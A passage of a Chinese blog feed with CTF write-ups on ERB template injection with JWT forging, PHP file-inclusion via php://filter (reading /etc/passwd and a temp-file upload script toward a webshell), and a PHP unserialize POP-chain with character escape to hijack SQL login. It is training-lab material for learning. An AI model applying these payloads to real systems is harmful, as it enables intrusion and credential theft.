</p><p>最后一次成功匹配？？？上面那个？？</p><p>构造<code>&lt;%=$&#39;%&gt;</code>正好七位     </p><p>还要hex编码，不知道为什么。。。。。。。       </p><p>payload：<code>/work?SECRET=&amp;name=%3C%25%3D%24%27%25%3E&amp;do=%3C%25%3D%24%27%25%3E%20is%20working</code>     </p><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/171834/33/7788/70013/60915948Eff3e1215/1de2e42b943ae0db.png" alt="03.png">   </p><p>返回的就是SECRET   </p><p>构造新的jwt    </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/194760/8/1229/73202/60915947E03771f73/f2ef6f29d8c4d0dc.png" alt="04.png"> </p><p>写入cookie     </p><p>flag在返回头的cookie里    </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/180216/2/2292/80981/60915947E137ed448/8c24414f41a9b8de.png" alt="05.png">     </p><p><a href="https://www.anquanke.com/post/id/86867">REB SSTI</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;|_|-|&quot;&gt;&lt;/a&gt;|_|-|&lt;/h2&gt;&lt;p&gt;打开环境&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img13.360buyimg.com/ddimg/jfs/t1/17295</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="jwt" scheme="http://lll-nnn.github.io/categories/CTF/jwt/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="jwt" scheme="http://lll-nnn.github.io/tags/jwt/"/>
    
    <category term="ruby" scheme="http://lll-nnn.github.io/tags/ruby/"/>
    
    <category term="ERB" scheme="http://lll-nnn.github.io/tags/ERB/"/>
    
    <category term="SSTI" scheme="http://lll-nnn.github.io/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>Ezinclude</title>
    <link href="http://lll-nnn.github.io/2021/05/01/BUU81/"/>
    <id>http://lll-nnn.github.io/2021/05/01/BUU81/</id>
    <published>2021-05-01T15:07:45.000Z</published>
    <updated>2021-05-01T15:55:00.334Z</updated>
    
    <content type="html"><![CDATA[<h2 id="【-】"><a href="#【-】" class="headerlink" title="【-+-    -+-】"></a><code>【-+-    -+-】</code></h2><p>进入环境<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/ec2beb98-e0a5-42f4-82d7-a399394609fe.png" alt="01.png">      </p><p>注释中有Hint      </p><p><code>&lt;!--md5($secret.$name)===$pass --&gt;</code>        </p><p>应该是要传入name和pass       </p><p>响应头里有一段hash值       </p><p>当成pass传入，name不传     </p><p><code>?pass=fa25e54758d5d5c1927781a6ede89f8a</code>      </p><p>有跳转，抓包     </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/1454b3cd-95be-480e-a3e5-4f6e0ce65151.png" alt="02.png">       </p><p>看一下<code>flflflflag.php</code>     </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/2e856e0a-e4e7-42c6-a5cd-3de410a8da3f.png" alt="03.png"></p><p>有include，伪协议读一下源码      </p><p><code>?file=php://filter/read=convert.base64.encode/resource=flflflflag.php</code>       </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/636b976a-82d7-40c9-b96b-5cb660f19217.png" alt="04.png">     </p><p>解码后       </p><pre><code><pre><code class="hljs php">&lt;html&gt;&lt;head&gt;&lt;script language=<span class="hljs-string">&quot;javascript&quot;</span> type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;           window.location.href=<span class="hljs-string">&quot;404.html&quot;</span>;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;<span class="hljs-meta">&lt;?php</span>$file=$_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/data|input|zip/is&#x27;</span>,$file))&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);&#125;@<span class="hljs-keyword">include</span>($file);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;<span class="hljs-meta">?&gt;</span>&lt;/body&gt;&lt;/html&gt;</code></pre></code></pre><p>感觉也没啥啊       </p><p>接下来利用<code>php://filter/string.strip_tags</code>       </p><p>php7.0的BUG</p><p>payload:<code>?file=php://filter/string.strip_tags/resource=/etc/passwd</code>       </p><p>输入payload后，会导致PHP崩溃清空堆栈重启，如果同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell         </p><p><a href="https://www.cnblogs.com/tr1ple/p/11301743.html">关于php文件操作的几个小trick </a></p><p>上传脚本     </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIOurl=<span class="hljs-string">&#x27;http://e17fbb9d-53e9-44fc-9c60-91d0f4e7e017.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span>file=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:BytesIO(<span class="hljs-string">b&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>)&#125;r=requests.post(url=url,files=file,allow_redirects=<span class="hljs-literal">False</span>)print(<span class="hljs-string">&quot;YEs&quot;</span>)</code></pre></code></pre><p>应该写一句话木马的，但我试了好几次都没成功，<code>phpinfo();</code>都没法执行       </p><p>然后会在<code>dir.php</code>（包含/tmp中的文件）中得到文件名       </p><p><code>array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [4]=&gt; string(9) &quot;phpTwf0sR&quot;</code>      </p><p>包含即可      </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/4f1e5174-3581-4ee9-bbc9-9e1cd96ee7f2.png" alt="05.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;【-】&quot;&gt;&lt;a href=&quot;#【-】&quot; class=&quot;headerlink&quot; title=&quot;【-+-    -+-】&quot;&gt;&lt;/a&gt;&lt;code&gt;【-+-    -+-】&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;进入环境&lt;br&gt;&lt;img src=&quot;https://zebra-com</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="PHP" scheme="http://lll-nnn.github.io/categories/CTF/PHP/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="文件读取" scheme="http://lll-nnn.github.io/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    
    <category term="php://filter/string.strip_tags" scheme="http://lll-nnn.github.io/tags/php-filter-string-strip-tags/"/>
    
  </entry>
  
  <entry>
    <title>Easyphp</title>
    <link href="http://lll-nnn.github.io/2021/04/30/BUU80/"/>
    <id>http://lll-nnn.github.io/2021/04/30/BUU80/</id>
    <published>2021-04-30T15:02:32.000Z</published>
    <updated>2021-05-04T15:58:52.957Z</updated>
    
    <content type="html"><![CDATA[<h2 id="unserialize-char-escape"><a href="#unserialize-char-escape" class="headerlink" title="unserialize char-escape"></a>unserialize char-escape</h2><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/186967/37/782/447665/608c1c8bE8f062515/dd33c81b065b285b.png" alt="01.png"></p><p>没有<code>registe.php</code>     </p><p>一开始猜的是SQL注入       </p><p>注入了一会，有点想放弃了，看了下<code>www.zip</code>   </p><p>居然有     </p><p>看来不是SQLi了      </p><p>四个PHP文件    </p><p><code>index.php</code>      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;lib.php&quot;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]))&#123;<span class="hljs-keyword">require_once</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&quot;/&quot;</span>.$_GET[<span class="hljs-string">&#x27;action&#x27;</span>].<span class="hljs-string">&quot;.php&quot;</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>]==<span class="hljs-number">1</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p><code>lib.php</code>        </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);session_start();<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params">$parm</span>)</span><span class="hljs-function"></span>&#123;    $array = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;union&#x27;</span>, <span class="hljs-string">&#x27;regexp&#x27;</span>, <span class="hljs-string">&#x27;load&#x27;</span>, <span class="hljs-string">&#x27;into&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;alter&quot;</span>);    <span class="hljs-keyword">return</span> str_replace($array, <span class="hljs-string">&#x27;hacker&#x27;</span>, $parm);&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $id;    <span class="hljs-keyword">public</span> $age = <span class="hljs-literal">null</span>;    <span class="hljs-keyword">public</span> $nickname = <span class="hljs-literal">null</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;            $mysqli = <span class="hljs-keyword">new</span> dbCtrl();            <span class="hljs-keyword">$this</span>-&gt;id = $mysqli-&gt;login(<span class="hljs-string">&#x27;select id,password from user where username=?&#x27;</span>);            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;id) &#123;                $_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;id;                $_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>] = <span class="hljs-number">1</span>;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你的ID是&quot;</span> . $_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>];                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你好！&quot;</span> . $_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>];                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;id;            &#125;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $Info = unserialize(<span class="hljs-keyword">$this</span>-&gt;getNewinfo());        $age = $Info-&gt;age;        $nickname = $Info-&gt;nickname;        $updateAction = <span class="hljs-keyword">new</span> UpdateHelper($_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>], $Info, <span class="hljs-string">&quot;update user SET age=<span class="hljs-subst">$age</span>,nickname=<span class="hljs-subst">$nickname</span> where id=&quot;</span> . $_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>]);        <span class="hljs-comment">//这个功能还没有写完 先占坑</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNewInfo</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $age = $_POST[<span class="hljs-string">&#x27;age&#x27;</span>];        $nickname = $_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>];        <span class="hljs-keyword">return</span> safe(serialize(<span class="hljs-keyword">new</span> Info($age, $nickname)));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;nickname); <span class="hljs-comment">//危</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;nickname-&gt;update(<span class="hljs-keyword">$this</span>-&gt;age);        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0-0&quot;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $age;    <span class="hljs-keyword">public</span> $nickname;    <span class="hljs-keyword">public</span> $CtrlCase;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$age, $nickname</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;age = $age;        <span class="hljs-keyword">$this</span>-&gt;nickname = $nickname;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$name, $argument</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="hljs-number">0</span>]);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UpdateHelper</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $id;    <span class="hljs-keyword">public</span> $newinfo;    <span class="hljs-keyword">public</span> $sql;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$newInfo, $sql</span>)</span><span class="hljs-function">    </span>&#123;        $newInfo = unserialize($newInfo);        $upDate = <span class="hljs-keyword">new</span> dbCtrl();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;sql;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $hostname = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;    <span class="hljs-keyword">public</span> $dbuser = <span class="hljs-string">&quot;root&quot;</span>;    <span class="hljs-keyword">public</span> $dbpass = <span class="hljs-string">&quot;root&quot;</span>;    <span class="hljs-keyword">public</span> $database = <span class="hljs-string">&quot;test&quot;</span>;    <span class="hljs-keyword">public</span> $name;    <span class="hljs-keyword">public</span> $password;    <span class="hljs-keyword">public</span> $mysqli;    <span class="hljs-keyword">public</span> $token;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;name = $_POST[<span class="hljs-string">&#x27;username&#x27;</span>];        <span class="hljs-keyword">$this</span>-&gt;password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];        <span class="hljs-keyword">$this</span>-&gt;token = $_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>];    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params">$sql</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;mysqli = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-keyword">$this</span>-&gt;hostname, <span class="hljs-keyword">$this</span>-&gt;dbuser, <span class="hljs-keyword">$this</span>-&gt;dbpass, <span class="hljs-keyword">$this</span>-&gt;database);        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败，错误:&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;mysqli-&gt;connect_error);        &#125;        $result = <span class="hljs-keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);        $result-&gt;bind_param(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;name);        $result-&gt;execute();        $result-&gt;bind_result($idResult, $passwordResult);        $result-&gt;fetch();        $result-&gt;close();        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;token == <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;            <span class="hljs-keyword">return</span> $idResult;        &#125;        <span class="hljs-keyword">if</span> (!$idResult) &#123;            <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;用户不存在!&#x27;</span>);            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;        <span class="hljs-keyword">if</span> (md5(<span class="hljs-keyword">$this</span>-&gt;password) !== $passwordResult) &#123;            <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;密码错误！&#x27;</span>);            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;        $_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;name;        <span class="hljs-keyword">return</span> $idResult;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params">$sql</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">//还没来得及写</span>    &#125;&#125;</code></pre></code></pre><p><code>login.php</code>      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);<span class="hljs-meta">?&gt;</span>&lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt; &lt;title&gt;login&lt;/title&gt;&lt;center&gt;&lt;form action=<span class="hljs-string">&quot;login.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> style=<span class="hljs-string">&quot;margin-top: 300&quot;</span>&gt;&lt;h2&gt;百万前端的用户信息管理系统&lt;/h2&gt;&lt;h3&gt;半成品系统 留后门的程序员已经跑路&lt;/h3&gt;        &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span> placeholder=<span class="hljs-string">&quot;UserName&quot;</span> required&gt;&lt;br&gt;&lt;input type=<span class="hljs-string">&quot;password&quot;</span> style=<span class="hljs-string">&quot;margin-top: 20&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span> placeholder=<span class="hljs-string">&quot;password&quot;</span> required&gt;&lt;br&gt;&lt;button style=<span class="hljs-string">&quot;margin-top:20;&quot;</span> type=<span class="hljs-string">&quot;submit&quot;</span>&gt;登录&lt;/button&gt;&lt;br&gt;&lt;img src=<span class="hljs-string">&#x27;img/1.jpg&#x27;</span>&gt;大家记得做好防护&lt;/img&gt;&lt;br&gt;&lt;br&gt;<span class="hljs-meta">&lt;?php</span> $user=<span class="hljs-keyword">new</span> user();<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, $_POST[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br&gt;Damn you, hacker!&quot;</span>);&#125;<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, $_POST[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Damn you, hacker!&quot;</span>);&#125;$user-&gt;login();&#125;<span class="hljs-meta">?&gt;</span>&lt;/form&gt;&lt;/center&gt;</code></pre></code></pre><p><code>update.php</code>       </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;html&gt;</span><span class="hljs-string">&lt;meta charset=&quot;utf-8&quot;&gt;</span><span class="hljs-string">&lt;title&gt;update&lt;/title&gt;</span><span class="hljs-string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span><span class="hljs-string">&lt;/html&gt;&#x27;</span>;<span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>]!=<span class="hljs-number">1</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你还没有登陆呢！&quot;</span>;&#125;$users=<span class="hljs-keyword">new</span> User();$users-&gt;update();<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>]===<span class="hljs-number">1</span>)&#123;<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<span class="hljs-keyword">echo</span> $flag;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>这个网站的逻辑就是要以admin登录，通过SQL语句查询，比较ID和passwd，正确的话，跳转到<code>update.php</code>，得到flag    </p><p>主要是<code>lib.php</code>     </p><pre><code>function safe($parm)&#123;    $array = array(&#39;union&#39;, &#39;regexp&#39;, &#39;load&#39;, &#39;into&#39;, &#39;flag&#39;, &#39;file&#39;, &#39;insert&#39;, &quot;&#39;&quot;, &#39;\\&#39;, &quot;*&quot;, &quot;alter&quot;);    return str_replace($array, &#39;hacker&#39;, $parm);&#125;</code></pre><p>看到这个，应该想到那个反序列化的字符逃逸了    </p><pre><code>$this-&gt;id = $mysqli-&gt;login(&#39;select id,password from user where username=?&#39;);         </code></pre><hr><pre><code>public function __call($name, $argument)    &#123;        echo $this-&gt;CtrlCase-&gt;login($argument[0]);    &#125;</code></pre><p>两个login，而且第二个login的参数是可控的     </p><p>所以     </p><p>以此，构造pop链反序列化修改SQL语句     </p><p>入口—&gt;update.php里的       </p><pre><code>$users=new User();$users-&gt;update();        </code></pre><p>跟进<code>lib.php</code>里的update()      </p><p>首先<code>  $Info = unserialize($this-&gt;getNewinfo());</code>应该是出口了      </p><p>这个<code>$updateAction = new UpdateHelper($_SESSION[&#39;id&#39;],$Info, &quot;update user SET age=$age,nickname=$nickname where id=&quot; . $_SESSION[&#39;id&#39;]);</code>    </p><p>跟进<code>UpdateHelper</code>    </p><p><code>$sql</code>没有使用，且<code>echo $this-&gt;sql;</code>        </p><p>让<code>sql=new User()</code>来触发toString     </p><pre><code>public function __toString()    &#123;        $this-&gt;nickname-&gt;update($this-&gt;age);        return &quot;0-0&quot;;    &#125; </code></pre><p>让<code>nickname=new Info()</code>来触发<code>__call</code></p><pre><code>public function __call($name, $argument)&#123;    echo $this-&gt;CtrlCase-&gt;login($argument[0]);&#125;      </code></pre><p>接着让<code>CtrlCase=new dbCtrl()</code>就可以执行自定的SQL了    </p><p>将password修改     </p><pre><code>select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code></pre><p>c4ca4238a0b923820dcc509a6f75849b是1的MD5值      </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/192784/20/706/130842/608c3197Ec5588c09/d8bef464f63eb40a.png" alt="03.png"></p><p>这样再控制dbCtrl里的name和password就可以以admin登录       </p><p>之后     </p><pre><code>$_SESSION[&#39;token&#39;] = $this-&gt;name;        return $idResult;      </code></pre><p>重新登陆时不管密码是什么都能登陆成功，得到flag了     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UpdateHelper</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $sql;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;sql=<span class="hljs-keyword">new</span> User();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $age;    <span class="hljs-keyword">public</span> $nickname;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;                <span class="hljs-keyword">$this</span>-&gt;age=<span class="hljs-string">&#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;</span>;        <span class="hljs-keyword">$this</span>-&gt;nickname=<span class="hljs-keyword">new</span> Info();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $CtrlCase;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;CtrlCase=<span class="hljs-keyword">new</span> dbCtrl();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">&#x27;admin&#x27;</span>;    <span class="hljs-keyword">public</span> $password=<span class="hljs-string">&#x27;1&#x27;</span>;&#125;$a=<span class="hljs-keyword">new</span> UpdateHelper();<span class="hljs-keyword">echo</span> serialize($a);</code></pre></code></pre><p>结果为</p><pre><code>O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;      </code></pre><p>回到出口处     </p><p><code>getNewInfo()</code>中     </p><pre><code>return safe(serialize(new Info($age, $nickname)));     </code></pre><p>这里序列化的是一个新类，这样的话，刚才得到的payload只会被视为一个长的字符串，并不会被反序列化       </p><p>所以要字符逃逸       </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $age=<span class="hljs-number">1</span>;    <span class="hljs-keyword">public</span> $nickname=<span class="hljs-string">&#x27;123&#x27;</span>;    <span class="hljs-keyword">public</span> $CtrlCase=<span class="hljs-number">123</span>;&#125;$a=<span class="hljs-keyword">new</span> Info();<span class="hljs-keyword">echo</span> serialize($a);</code></pre></code></pre><p>输出：<code>O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;i:1;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:8:&quot;CtrlCase&quot;;i:123;&#125;</code>       </p><p>要想逃逸，需要再刚才的payload前加上<code>&quot;;s:8:&quot;CtrlCase&quot;;</code>（<code>&quot;</code>来闭合序列化后生成的<code>&quot;</code>）后面加上<code>&#125;</code>来提前结束反序列化     </p><p>payload:<code>&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where 